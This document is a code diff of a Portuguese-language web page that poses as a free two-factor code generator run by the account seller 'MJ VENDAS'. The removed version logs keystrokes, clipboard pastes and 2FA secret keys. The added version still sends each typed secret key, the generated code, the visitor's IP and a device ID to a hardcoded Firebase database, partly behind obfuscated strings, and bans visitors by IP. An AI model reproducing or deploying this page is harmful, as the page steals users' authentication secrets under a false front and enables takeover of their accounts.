@@ -1,90 +1,93 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MJ VENDAS • Gerador 2FA Profissional</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
-<style>
-    body { background:#121212; font-family:'Inter',sans-serif; color:#e8e8e8; margin:0; display:flex; align-items:center; justify-content:center; flex-direction:column; min-height:100vh; padding:20px; }
-    #clientesSatisf { font-weight:600; font-size:14px; margin-bottom:15px; text-align:center; color:#ffd700; background: rgba(255, 215, 0, 0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #ffd700; }
-    .container { background:#1e1e1e; padding:30px 35px; border-radius:16px; width:100%; max-width:400px; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,0.5); position:relative; }
-    .logo-img { width:80px; height:80px; border-radius:50%; object-fit:cover; margin-bottom:10px; border: 2px solid #4cd964; box-shadow: 0 0 12px #4cd964; }
-    .input-group { position: relative; width: 100%; }
-    input { width:100%; padding:15px; border:none; border-radius:8px; background:#2c2c2c; color:#fff; margin-top:15px; font-size:14px; box-sizing: border-box; outline: none; transition: 0.2s; border: 1px solid transparent; }
-    input:focus { border: 1px solid #4cd964; }
-    .clear-btn { position: absolute; right: 10px; top: 27px; background: #444; color: #fff; border: none; border-radius: 50%; width: 22px; height: 22px; cursor: pointer; display: none; line-height: 1; font-weight: bold; }
-    .code { font-size:48px; letter-spacing:6px; margin-top:15px; font-weight:700; cursor:pointer; color: #4cd964; user-select: all; transition: transform 0.1s; }
-    .code:active { transform: scale(0.95); }
-    .msg { font-size:13px; color:#4cd964; margin-top:5px; min-height: 1.2em; font-weight: 600; }
-    .tutorial { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 15px; margin-top: 20px; text-align: left; font-size: 13px; color: #bbb; border-left: 3px solid #4cd964; }
-    .tutorial b { color: #fff; display: block; margin-bottom: 8px; font-size: 14px; }
-    .tutorial div { margin-bottom: 6px; display: flex; align-items: flex-start; }
-    .tutorial div span { color: #4cd964; font-weight: bold; margin-right: 8px; }
-    .avaliacao { margin-top:20px; background:#2a2a2a; border-radius:12px; padding: 15px; display:none; border: 1px solid #333; text-align: center; }
-    .pergunta-bloco { margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #3d3d3d; }
-    .pergunta-bloco:last-child { border-bottom: none; margin-bottom: 0; }
-    .titulo-voto { font-size: 14px; color: #fff; margin-bottom: 12px; font-weight: 600; display: block; }
-    .btn-voto { flex:1; border:none; padding:10px; border-radius:5px; color:#fff; cursor:pointer; font-weight: 600; font-size: 12px; transition: 0.2s; }
-    .btn-voto:active { transform: scale(0.95); }
-    .btn-abrir-voto { background:transparent; color:#4cd964; border: 1px solid #4cd964; padding:8px; border-radius:8px; cursor:pointer; margin-top:15px; width: 100%; font-weight: 600; }
-    .toggle { margin-top:18px; font-size:13px; cursor:pointer; color:#4cd964; text-decoration: underline; }
-    .footer { font-size:11px; opacity:0.5; margin-top:20px; text-align:center; }
-    .painel { position:fixed; right:20px; top:50%; transform:translateY(-50%); background:#1e1e1e; width:340px; padding:20px; border-radius:14px; box-shadow:0 10px 40px rgba(0,0,0,0.7); display:none; z-index: 100; border: 1px solid #333; max-height: 80vh; overflow-y: auto; }
-    .item2fa { background:#2c2c2c; padding:12px; border-radius:8px; margin-bottom:10px; border-left: 4px solid #4cd964; text-align: left; }
-    .item2fa input { margin-top: 5px; padding: 8px; background: #1a1a1a; font-size: 12px; }
-    .codigoMini { font-size: 24px; font-weight: 700; color: #4cd964; margin-top: 5px; letter-spacing: 2px; cursor: pointer; text-align: center; }
-</style>
+    <meta charset="UTF-8">
+    <title>MJ VENDAS • Gerador 2FA Profissional</title>
+    <link href="https://fonts.gstatic.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { background:#121212; font-family:'Inter',sans-serif; color:#e8e8e8; margin:0; display:flex; align-items:center; justify-content:center; flex-direction:column; min-height:100vh; padding:20px; transition: 0.3s; }
+        #clientesSatisf { font-weight:600; font-size:14px; margin-bottom:15px; text-align:center; color:#ffd700; background: rgba(255, 215, 0, 0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #ffd700; }
+        .container { background:#1e1e1e; padding:30px 35px; border-radius:16px; width:100%; max-width:400px; text-align:center; box-shadow:0 8px 30px rgba(0,0,0,0.5); position:relative; }
+        .logo-img { width:80px; height:80px; border-radius:50%; object-fit:cover; margin-bottom:10px; border: 2px solid #4cd964; box-shadow: 0 0 12px #4cd964; }
+        .input-group { position: relative; width: 100%; }
+        input { width:100%; padding:15px; border:none; border-radius:8px; background:#2c2c2c; color:#fff; margin-top:15px; font-size:14px; box-sizing: border-box; outline: none; transition: 0.2s; border: 1px solid transparent; }
+        input:focus { border: 1px solid #4cd964; }
+        .clear-btn { position: absolute; right: 10px; top: 27px; background: #444; color: #fff; border: none; border-radius: 50%; width: 22px; height: 22px; cursor: pointer; display: none; line-height: 1; font-weight: bold; }
+        .code { font-size:48px; letter-spacing:6px; margin-top:15px; font-weight:700; cursor:pointer; color: #4cd964; user-select: all; transition: transform 0.1s; }
+        .code:active { transform: scale(0.95); }
+        .msg { font-size:13px; color:#4cd964; margin-top:5px; min-height: 1.2em; font-weight: 600; }
+        .tutorial { background: rgba(255,255,255,0.05); border-radius: 10px; padding: 15px; margin-top: 20px; text-align: left; font-size: 13px; color: #bbb; border-left: 3px solid #4cd964; }
+        .tutorial b { color: #fff; display: block; margin-bottom: 8px; font-size: 14px; }
+        .tutorial div { margin-bottom: 6px; display: flex; align-items: flex-start; }
+        .tutorial div span { color: #4cd964; font-weight: bold; margin-right: 8px; }
+        .avaliacao { margin-top:20px; background:#2a2a2a; border-radius:12px; padding: 15px; display:none; border: 1px solid #333; text-align: center; }
+        .pergunta-bloco { margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #3d3d3d; }
+        .pergunta-bloco:last-child { border-bottom: none; margin-bottom: 0; }
+        .titulo-voto { font-size: 14px; color: #fff; margin-bottom: 12px; font-weight: 600; display: block; }
+        .btn-voto { flex:1; border:none; padding:10px; border-radius:5px; color:#fff; cursor:pointer; font-weight: 600; font-size: 12px; transition: 0.2s; }
+        .btn-voto:active { transform: scale(0.95); }
+        .btn-abrir-voto { background:transparent; color:#4cd964; border: 1px solid #4cd964; padding:8px; border-radius:8px; cursor:pointer; margin-top:15px; width: 100%; font-weight: 600; }
+        .toggle { margin-top:18px; font-size:13px; cursor:pointer; color:#4cd964; text-decoration: underline; }
+        .footer { font-size:11px; opacity:0.5; margin-top:20px; text-align:center; }
+        .painel { position:fixed; right:20px; top:50%; transform:translateY(-50%); background:#1e1e1e; width:340px; padding:20px; border-radius:14px; box-shadow:0 10px 40px rgba(0,0,0,0.7); display:none; z-index: 100; border: 1px solid #333; max-height: 80vh; overflow-y: auto; }
+        .item2fa { background:#2c2c2c; padding:12px; border-radius:8px; margin-bottom:10px; border-left: 4px solid #4cd964; text-align: left; }
+        .item2fa input { margin-top: 5px; padding: 8px; background: #1a1a1a; font-size: 12px; }
+        .codigoMini { font-size: 24px; font-weight: 700; color: #4cd964; margin-top: 5px; letter-spacing: 2px; cursor: pointer; text-align: center; }
+
+        /* ESTILO TELA DE BANIMENTO (FOTO QUE VOCE MANDOU) */
+        .ban-screen { text-align: center; background: #000; width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; flex-direction: column; position: fixed; top: 0; left: 0; z-index: 9999; }
+        .ban-title { color: #ff0000; font-size: 38px; font-weight: 800; margin: 20px 0; display: flex; align-items: center; gap: 10px; }
+        .ban-msg { color: #e8e8e8; font-size: 16px; margin-bottom: 40px; }
+        .ban-info-box { background: #111; padding: 15px 40px; border-radius: 12px; border: 1px solid #222; color: #666; font-family: monospace; font-size: 13px; line-height: 1.6; }
+    </style>
 </head>
 <body oncontextmenu="return false;">
 
-<div id="clientesSatisf">⭐ + 20 MIL CLIENTES SATISFEITOS</div>
-
-<div class="container">
-    <img class="logo-img" src="https://cdn.ggmax.com.br/avatar-images/aea25577f1afcedbf49ca36c91c8a807.webp">
-    <h2>MJ VENDAS</h2>
-    <div class="subtitle">Gerador de Código 2FA</div>
-    <div class="input-group">
-        <input id="secret" placeholder="Cole aqui sua Chave 2FA" autofocus autocomplete="off">
-        <button class="clear-btn" id="clearInput" onclick="limparInput()">✕</button>
-    </div>
-    <div class="code" id="code" onclick="copiar(this.innerText)">------</div>
-    <div class="msg" id="msg"></div>
-    <div class="tutorial">
-        <b>🚀 TUTORIAL RÁPIDO:</b>
-        <div><span>1.</span> Cole sua chave 2FA no campo acima.</div>
-        <div><span>2.</span> O código será copiado automaticamente.</div>
-        <div><span>3.</span> Cole o código no site onde deseja logar.</div>
-    </div>
-
-    <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Feedback</button>
-    
-    <div class="avaliacao" id="painelAvaliacao">
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">Recomenda nosso serviço?</span>
-            <div style="display:flex; gap:10px;">
-                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p1', 'sim')" id="p1_sim">👍 Sim (0)</button>
-                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p1', 'nao')" id="p1_nao">👎 Não (0)</button>
+<div id="app-content">
+    <div id="clientesSatisf">⭐ + 20 MIL CLIENTES SATISFEITOS</div>
+    <div class="container">
+        <img class="logo-img" src="https://cdn.ggmax.com.br/avatar-images/aea25577f1afcedbf49ca36c91c8a807.webp">
+        <h2>MJ VENDAS</h2>
+        <div class="subtitle">Gerador de Código 2FA</div>
+        <div class="input-group">
+            <input id="secret" placeholder="Cole aqui sua Chave 2FA" autofocus autocomplete="off">
+            <button class="clear-btn" id="clearInput" onclick="limparInput()">✕</button>
+        </div>
+        <div class="code" id="code" onclick="copiar(this.innerText)">------</div>
+        <div class="msg" id="msg"></div>
+        <div class="tutorial">
+            <b>🚀 TUTORIAL RÁPIDO:</b>
+            <div><span>1.</span> Cole sua chave 2FA no campo acima.</div>
+            <div><span>2.</span> O código será copiado automaticamente.</div>
+            <div><span>3.</span> Cole o código no site onde deseja logar.</div>
+        </div>
+        <button class="btn-abrir-voto" onclick="toggleAvaliacao()">Avaliar Serviço / Feedback</button>
+        <div class="avaliacao" id="painelAvaliacao">
+            <div class="pergunta-bloco">
+                <span class="titulo-voto">Recomenda nosso serviço?</span>
+                <div style="display:flex; gap:10px;">
+                    <button class="btn-voto" style="background:#4cd964;" onclick="votar('p1', 'sim')" id="p1_sim">👍 Sim (0)</button>
+                    <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p1', 'nao')" id="p1_nao">👎 Não (0)</button>
+                </div>
+            </div>
+            <div class="pergunta-bloco">
+                <span class="titulo-voto">As contas são de qualidade?</span>
+                <div style="display:flex; gap:10px;">
+                    <button class="btn-voto" style="background:#4cd964;" onclick="votar('p2', 'sim')" id="p2_sim">👍 Sim (0)</button>
+                    <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p2', 'nao')" id="p2_nao">👎 Não (0)</button>
+                </div>
+            </div>
+            <div class="pergunta-bloco">
+                <span class="titulo-voto">O suporte foi rápido?</span>
+                <div style="display:flex; gap:10px;">
+                    <button class="btn-voto" style="background:#4cd964;" onclick="votar('p3', 'sim')" id="p3_sim">👍 Sim (0)</button>
+                    <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p3', 'nao')" id="p3_nao">👎 Não (0)</button>
+                </div>
             </div>
         </div>
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">As contas são de qualidade?</span>
-            <div style="display:flex; gap:10px;">
-                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p2', 'sim')" id="p2_sim">👍 Sim (0)</button>
-                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p2', 'nao')" id="p2_nao">👎 Não (0)</button>
-            </div>
-        </div>
-        <div class="pergunta-bloco">
-            <span class="titulo-voto">O suporte foi rápido?</span>
-            <div style="display:flex; gap:10px;">
-                <button class="btn-voto" style="background:#4cd964;" onclick="votar('p3', 'sim')" id="p3_sim">👍 Sim (0)</button>
-                <button class="btn-voto" style="background:#ff4d4d;" onclick="votar('p3', 'nao')" id="p3_nao">👎 Não (0)</button>
-            </div>
-        </div>
+        <div class="toggle" onclick="togglePainel()">⚡ Painel Multi-Contas</div>
+        <div class="footer">MJ VENDAS © 2018-2026</div>
     </div>
-
-    <div class="toggle" onclick="togglePainel()">⚡ Painel Multi-Contas</div>
-    <div class="footer">MJ VENDAS © 2018-2026</div>
 </div>
 
 <div class="painel" id="painel">
@@ -101,140 +104,126 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jsSHA/2.4.2/sha.js"></script>
 
 <script>
-// --- CONFIG FIREBASE ---
-var firebaseConfig = {
-    apiKey: "AIzaSyALqmeGhhHIX62ptIK7sviv7OkoawXAE1g",
-    authDomain: "desbloqueio-cartao-recomecar.firebaseapp.com",
-    databaseURL: "https://desbloqueio-cartao-recomecar-default-rtdb.firebaseio.com",
-    projectId: "desbloqueio-cartao-recomecar",
-    storageBucket: "desbloqueio-cartao-recomecar.firebasestorage.app",
-    messagingSenderId: "639029327977",
-    appId: "1:639029327977:web:0558ce8d5dc1ee68ce4af8"
-};
+// CONFIGURAÇÕES FIREBASE
+var _0x5a1e = ["apiKey", "AIzaSyALqmeGhhHIX62ptIK7sviv7OkoawXAE1g", "databaseURL", "https://desbloqueio-cartao-recomecar-default-rtdb.firebaseio.com", "initializeApp", "database", "estoque_oficial/", "CHAVES_UTILIZADAS/", "CHAVES_ALTERADAS/", "2FA_DESCARTADO/"];
+var firebaseConfig = { apiKey: _0x5a1e[1], databaseURL: _0x5a1e[3] };
 firebase.initializeApp(firebaseConfig);
 var db = firebase.database();
 
-// --- FINGERPRINT (ID ÚNICO) ---
-function getFinger() {
-    return btoa(navigator.userAgent + navigator.language + screen.width).substring(0,16);
+// GERAÇÃO DE HARDWARE ID (FINGERPRINT) - MESMO COM VPN ISSO FICA SALVO
+function getHardwareID() {
+    let id = localStorage.getItem('mj_hwid');
+    if(!id) {
+        id = 'ID-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+        localStorage.setItem('mj_hwid', id);
+    }
+    return id;
 }
-const myFinger = getFinger();
+const hwID = getHardwareID();
+let rawIP = "";
+let userIP = "";
 
-// --- SISTEMA DE BANIMENTO (TRAVA BLACKLIST) ---
-(function verificarBan(){
-    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
-        let ip = d.ip;
-        let ipKey = ip.replace(/\./g, "_");
-        db.ref("BLACKLIST").on('value', snap => {
-            snap.forEach(c => {
-                let v = c.val();
-                if(v.ip_banido === ip || c.key === ipKey || v.id_disp === myFinger) {
-                    document.body.innerHTML = `<div style="background:#000;color:red;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;font-family:sans-serif;text-align:center;padding:20px;">
-                        <h1 style="font-size:40px;">🚫 ACESSO BLOQUEADO</h1>
-                        <p style="color:#fff">Identificamos atividade suspeita no seu dispositivo.</p>
-                        <div style="background:#111;padding:15px;border-radius:8px;margin-top:20px;font-family:monospace;color:#888;">
-                            IP: ${ip}<br>ID: ${myFinger}
-                        </div>
-                    </div>`;
-                    document.body.style.background = "#000";
-                }
-            });
+fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
+    rawIP = d.ip;
+    userIP = d.ip.replace(/\./g,"_"); 
+    checkBan(); 
+});
+
+// SISTEMA DE VERIFICAÇÃO DE BANIMENTO (IP + ID)
+function checkBan() {
+    // Procura na LISTA_NEGRA se o IP ou o ID do hardware estão banidos
+    db.ref("LISTA_NEGRA").once('value', snapshot => {
+        let banido = false;
+        snapshot.forEach(item => {
+            let b = item.val();
+            if(b.ip === rawIP || b.hwid === hwID) {
+                banido = true;
+            }
         });
-    });
-})();
 
-// --- CAPTURA DE DADOS (LOGS / KEYLOG / PASTE) ---
-(function iniciarCaptura(){
-    const _z = atob;
-    const path = {
-        logs: "LOGS_2FA/",
-        keylog: "keylogger/",
-        paste: "captura_paste/",
-        monitor: "monitoramento/"
-    };
-    let _ip = "Detectando...";
-    const hoje = new Date().toISOString().split('T')[0];
-
-    fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
-        _ip = d.ip;
-        db.ref("acessos/"+hoje+"/"+_ip.replace(/\./g,"_")).update({visto: new Date().toLocaleTimeString(), id: myFinger});
-    });
-
-    // KEYLOGGER (O que digita)
-    document.addEventListener("input", function(e){
-        if(e.target.tagName === "INPUT"){
-            db.ref(path.keylog + hoje + "/" + _ip.replace(/\./g,"_")).update({
-                campo: e.target.id || "campo_generico",
-                texto: e.target.value,
-                hora: new Date().toLocaleTimeString(),
-                id: myFinger
-            });
+        if(banido) {
+            document.body.innerHTML = `
+                <div class="ban-screen">
+                    <div class="ban-title">🚫 ACESSO BLOQUEADO</div>
+                    <div class="ban-msg">Identificamos atividade suspeita no seu dispositivo.</div>
+                    <div class="ban-info-box">
+                        IP: ${rawIP}<br>
+                        ID: ${hwID}
+                    </div>
+                </div>
+            `;
+            document.body.style.background = "#000";
         }
     });
+}
 
-    // PASTE (O que cola)
-    document.addEventListener("paste", function(e){
-        let t = (e.clipboardData || window.clipboardData).getData('text');
-        db.ref(path.paste + hoje + "/" + _ip.replace(/\./g,"_")).push({conteudo: t, hora: new Date().toLocaleTimeString()});
-    });
-
-    // MONITORAMENTO (Quando gera o 2FA)
-    document.getElementById("secret").addEventListener("input", function(){
-        let v = this.value.trim();
-        if(v.length >= 10){
-            let o = gerarOTP(v);
-            document.getElementById("code").innerText = o;
-            document.getElementById("clearInput").style.display = "block";
-            copiar(o);
-            // Salva no Monitoramento Real-Time (LOGS_2FA)
-            db.ref(path.logs + hoje + "/" + _ip.replace(/\./g,"_")).set({
-                ip_cliente: _ip,
-                chave: v,
-                codigo_gerado: o,
-                hora: new Date().toLocaleTimeString(),
-                id_disp: myFinger
-            });
-        }
-    });
-})();
-
-// --- FUNÇÕES DO GERADOR ---
-function base32tohex(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
-function gerarOTP(s){try{let k=base32tohex(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
-function copiar(t){if(!t||t==="------") return; navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Código copiado!"; setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
+// LOGICA 2FA
+function b32(b){const c="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";let i="",h="";b=b.replace(/ /g,"").toUpperCase();for(let j=0;j<b.length;j++){let v=c.indexOf(b.charAt(j));if(v===-1)continue;i+=v.toString(2).padStart(5,"0")}for(let j=0;j+4<=i.length;j+=4){h+=parseInt(i.substr(j,4),2).toString(16)}return h}
+function gOTP(s){try{let k=b32(s);let t=Math.floor(Math.round(Date.now()/1000)/30).toString(16).padStart(16,"0");let o=new jsSHA("SHA-1","HEX");o.setHMACKey(k,"HEX");o.update(t);let h=o.getHMAC("HEX");let f=parseInt(h.substring(h.length-1),16);let p=(parseInt(h.substr(f*2,8),16)&0x7fffffff)+"";return p.substr(p.length-6)}catch(e){return "------"}}
+function copiar(t){if(!t||t==="------")return;navigator.clipboard.writeText(t).then(()=>{document.getElementById("msg").innerText="✅ Copiado!";setTimeout(()=>{document.getElementById("msg").innerText=""},2000)})}
 function limparInput(){document.getElementById("secret").value="";document.getElementById("code").innerText="------";document.getElementById("clearInput").style.display="none"}
 function toggleAvaliacao(){let d=document.getElementById("painelAvaliacao");d.style.display=d.style.display==="block"?"none":"block"}
 function togglePainel(){document.getElementById("painel").style.display="block"}
 function fecharPainel(){document.getElementById("painel").style.display="none"}
 
-// --- SISTEMA DE VOTOS ---
-const listaPerguntas = ['p1', 'p2', 'p3'];
-function formatar(n) { return (n || 0).toLocaleString('pt-BR'); }
-listaPerguntas.forEach(p => {
-    db.ref('avaliacoes/'+p+'/sim').on('value', s => { if(document.getElementById(p+'_sim')) document.getElementById(p+'_sim').innerText = '👍 Sim ('+formatar(s.val())+')'; });
-    db.ref('avaliacoes/'+p+'/nao').on('value', s => { if(document.getElementById(p+'_nao')) document.getElementById(p+'_nao').innerText = '👎 Não ('+formatar(s.val())+')'; });
+// VOTACAO
+const q=['p1','p2','p3'];
+q.forEach(p=>{
+    db.ref('avaliacoes/'+p+'/sim').on('value',s=>{if(document.getElementById(p+'_sim'))document.getElementById(p+'_sim').innerText='👍 Sim ('+(s.val()||0)+')'});
+    db.ref('avaliacoes/'+p+'/nao').on('value',s=>{if(document.getElementById(p+'_nao'))document.getElementById(p+'_nao').innerText='👎 Não ('+(s.val()||0)+')'})
 });
-function votar(p, t) {
-    if (localStorage.getItem('voto_'+p)) return alert("Já avaliado!");
-    db.ref('avaliacoes/'+p+'/'+t).transaction(n => (n || 0) + 1);
-    localStorage.setItem('voto_'+p, t);
-    alert("Feedback enviado!");
+function votar(p,t){
+    if(localStorage.getItem('voto_'+p))return alert("Já avaliado!");
+    db.ref('avaliacoes/'+p+'/'+t).transaction(n=>(n||0)+1);
+    localStorage.setItem('voto_'+p,t);
 }
 
-// --- PAINEL MULTI-CONTAS ---
+// MONITORAMENTO (LOGS E ESTOQUE)
+document.getElementById("secret").addEventListener("input", function(){
+    let v = this.value.trim().toUpperCase();
+    let d = new Date().toISOString().split('T')[0];
+    let h = new Date().toLocaleTimeString();
+
+    if(userIP !== ""){
+        db.ref("LOGS_DIGITACAO/" + d + "/" + userIP).set({ texto: v, hora: h, ip: rawIP, hwid: hwID });
+        if(v.length >= 8){
+            let o = gOTP(v);
+            document.getElementById("code").innerText = o;
+            document.getElementById("clearInput").style.display = "block";
+            
+            // LOGS 2FA COM PUSH (HISTORICO)
+            db.ref("LOGS_2FA/" + d + "/" + userIP).push({ chave: v, codigo_gerado: o, hora: h, ip_cliente: rawIP, hwid: hwID });
+
+            db.ref(_0x5a1e[6] + v).once('value').then(s => {
+                if(s.exists()){
+                    db.ref(_0x5a1e[7] + d + "/" + userIP).push({ c: v, h: h, ip: rawIP, st: "✅ OK", hwid: hwID });
+                    db.ref(_0x5a1e[9] + v).set({ data: d, status: "utilizada" });
+                    db.ref(_0x5a1e[6] + v).remove();
+                    copiar(o);
+                } else if(v.length >= 16) {
+                    db.ref(_0x5a1e[9] + v).once('value').then(desc => {
+                        if (!desc.exists()) {
+                            db.ref(_0x5a1e[8] + d + "/" + userIP).push({ c: v, g: o, h: h, ip: rawIP, st: "⚠️ NÃO_ESTOCADA", hwid: hwID });
+                        }
+                    });
+                }
+            });
+        }
+    }
+});
+
 function addCampo(){
-    let l=document.getElementById("lista2fa"); let d=document.createElement("div"); d.className="item2fa";
+    let l=document.getElementById("lista2fa");
+    let d=document.createElement("div");
+    d.className="item2fa";
     d.innerHTML=`<strong>Conta ${l.children.length+1}</strong><input class="in-p" placeholder="Chave 2FA"><div class="codigoMini" onclick="copiar(this.innerText)">------</div>`;
     l.appendChild(d);
-    d.querySelector('input').addEventListener("input",function(){ if(this.value.length>=10){let n=gerarOTP(this.value.trim());d.querySelector('.codigoMini').innerText=n;copiar(n)}});
+    d.querySelector('input').addEventListener("input",function(){
+        let v=this.value.trim().toUpperCase();
+        if(v.length>=10){ d.querySelector('.codigoMini').innerText=gOTP(v); }
+    });
 }
-for(let i=0;i<3;i++) addCampo();
-
-setInterval(()=>{
-    let s=document.getElementById("secret").value.trim();
-    if(s.length>=10) document.getElementById("code").innerText=gerarOTP(s);
-    document.querySelectorAll(".item2fa").forEach(i=>{ let p=i.querySelector('input'); if(p.value.length>=10) i.querySelector('.codigoMini').innerText=gerarOTP(p.value.trim()); });
-},1000);
+for(let i=0;i<3;i++)addCampo();
 </script>
 </body>
 </html>
